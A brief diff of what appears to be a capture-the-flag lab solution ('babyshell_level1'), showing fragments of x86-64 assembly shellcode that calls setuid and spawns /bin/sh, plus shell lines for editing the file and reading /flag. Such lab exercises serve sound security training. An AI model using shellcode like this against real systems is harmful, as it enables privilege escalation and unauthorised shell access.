@@ -16,8 +16,8 @@ execution, your shellcode will need to be *position-independent*.
 
 //SOLUZIONE
 
+hacker@babyshell_level1:~$ nano my_script.s
 .global _start
-
 _start: 
 .intel_syntax noprefix
 	mov rax, 0x69	
@@ -32,3 +32,6 @@ _start:
 
 filename:
 	.string "/bin/sh"
+	
+cat /flag
+
